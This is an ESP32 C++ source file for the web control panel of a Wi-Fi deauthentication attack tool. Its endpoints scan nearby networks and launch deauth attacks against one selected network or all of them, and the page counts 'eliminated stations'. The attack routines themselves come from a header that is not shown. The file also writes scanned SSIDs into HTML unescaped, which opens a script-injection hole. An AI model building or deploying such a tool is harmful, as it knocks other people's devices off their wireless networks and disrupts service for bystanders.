#include <WebServer.h>
#include <FS.h>
#include "web_interface.h"
#include "definitions.h"
#include "deauth.h"
#include <SPIFFS.h>

WebServer server(80);
int num_networks;

// Move the function declaration to the top
String getEncryptionType(wifi_auth_mode_t encryptionType);

String loadTemplate(const char* filename) {
  File file = SPIFFS.open(filename, "r");
  if (!file) {
      return "Error: Template not found!";
  }
  String content = file.readString();
  file.close();
  return content;
}

void setup() {
  if (!SPIFFS.begin(true)) {
      Serial.println("An error occurred while mounting SPIFFS");
      return;
  }
  start_web_interface();
}

void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(301);
}

void handle_root() {
  String html = loadTemplate("/templates/root.html");

  // Remplacer les placeholders par des données dynamiques
  String networkRows;
  for (int i = 0; i < num_networks; i++) {
      String encryption = getEncryptionType(WiFi.encryptionType(i));
      networkRows += "<tr><td>" + String(i) + "</td><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" + 
                     String(WiFi.channel(i)) + "</td><td>" + String(WiFi.RSSI(i)) + "</td><td>" + encryption + "</td></tr>";
  }
  html.replace("{{NETWORK_ROWS}}", networkRows);
  html.replace("{{ELIMINATED_STATIONS}}", String(eliminated_stations));

  server.send(200, "text/html", html);
}


void handle_deauth() {
  int wifi_number = server.arg("net_num").toInt();
  uint16_t reason = server.arg("reason").toInt();

  String html = loadTemplate("/templates/deauth.html");

  if (wifi_number < num_networks) {
      html.replace("{{ALERT_CLASS}}", "");
      html.replace("{{TITLE}}", "Starting Deauth-Attack!");
      html.replace("{{MESSAGE}}", "Deauthenticating network number: " + String(wifi_number) + "<br>Reason code: " + String(reason));
      start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
  } else {
      html.replace("{{ALERT_CLASS}}", "error");
      html.replace("{{TITLE}}", "Error: Invalid Network Number");
      html.replace("{{MESSAGE}}", "Please select a valid network number.");
  }

  server.send(200, "text/html", html);
}

void handle_deauth_all() {
  uint16_t reason = server.arg("reason").toInt();

  String html = loadTemplate("/templates/deauth_all.html");
  html.replace("{{REASON_CODE}}", String(reason));

  server.send(200, "text/html", html);
  server.stop();
  start_deauth(0, DEAUTH_TYPE_ALL, reason);
}

void handle_rescan() {
  num_networks = WiFi.scanNetworks();
  redirect_root();
}

void handle_stop() {
  stop_deauth();
  redirect_root();
}

void start_web_interface() {
  server.on("/", handle_root);
  server.on("/deauth", handle_deauth);
  server.on("/deauth_all", handle_deauth_all);
  server.on("/rescan", handle_rescan);
  server.on("/stop", handle_stop);

  server.begin();
}

void web_interface_handle_client() {
  server.handleClient();
}

// The function implementation can stay where it is
String getEncryptionType(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "UNKNOWN";
  }
}
